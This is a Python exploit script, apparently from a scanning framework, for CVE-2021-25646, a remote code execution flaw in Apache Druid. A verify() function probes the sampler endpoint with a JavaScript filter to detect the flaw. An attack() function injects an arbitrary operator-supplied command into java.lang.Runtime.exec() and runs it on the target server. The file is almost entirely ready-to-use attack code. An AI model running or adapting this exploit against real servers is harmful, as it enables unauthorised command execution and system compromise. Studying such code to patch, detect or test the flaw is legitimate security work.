#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2021/2/4
# refer:https://www.tenable.com/cve/CVE-2021-25646
# https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg
import requests
import json

#requests.packages.urllib3.disable_warnings()
res = {}


def verify(target_node):
    target = target_node['target']
    url = target + "/druid/indexer/v1/sampler"
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Content-Type': 'application/json'}
    try :
        sess = requests.session()
        sess.headers = headers
        payload = {
        "type":"index",
        "spec":{
            "ioConfig":{
                "type":"index",
                "inputSource":{
                    "type":"inline",
                    "data":"{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat":{
                    "type":"json",
                    "keepNullColumns":True
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"timestamp",
                    "format":"iso"
                },
                "dimensionsSpec":{

                },
                "transformSpec":{
                    "transforms":[],
                    "filter":{
                        "type":"javascript",
                        "dimension":"added",
                        "function":"function(value) {java.io.abc()}",
                        "":{
                            "enabled":True
                        }
                    }
                }
            },
            "type":"index",
            "tuningConfig":{
                "type":"index"
            }
        },
        "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
        }
    }
        _response= sess.post(url,data=json.dumps(payload),verify=False)
        res_code = _response.status_code
        res_text = _response.text
        _keyword = "JavaPackage java.io"
        if 400 == res_code and _keyword in res_text:
                res['Info'] = 'FOUNDED VULNERABILTY!!!'
                res['Success'] = True
    except Exception as e:
        res['Info'] = e
        res['Success'] = False
    return res


def attack(target_node):
    target = target_node['target']
    param =  target_node['param']
    url = target + "/druid/indexer/v1/sampler"
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Content-Type': 'application/json'}
    try :
        sess = requests.session()
        sess.headers = headers
        payload = {
        "type":"index",
        "spec":{
            "ioConfig":{
                "type":"index",
                "inputSource":{
                    "type":"inline",
                    "data":"{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat":{
                    "type":"json",
                    "keepNullColumns":True
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"timestamp",
                    "format":"iso"
                },
                "dimensionsSpec":{

                },
                "transformSpec":{
                    "transforms":[],
                    "filter":{
                        "type":"javascript",
                        "dimension":"added",
                        "function":"function(value) {java.lang.Runtime.getRuntime().exec('%s')}"%(param),
                        "":{
                            "enabled":True
                        }
                    }
                }
            },
            "type":"index",
            "tuningConfig":{
                "type":"index"
            }
        },
        "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
        }
    }
        _response= sess.post(url,data=json.dumps(payload),verify=False)
        res_code = _response.status_code
        if 200== res_code:
                res['Info'] = 'VULNERABILTY Success Exploit!!!|%s'% param
                res['Success'] = True
    except Exception as e:
        res['Info'] = e
        res['Success'] = False
    return res

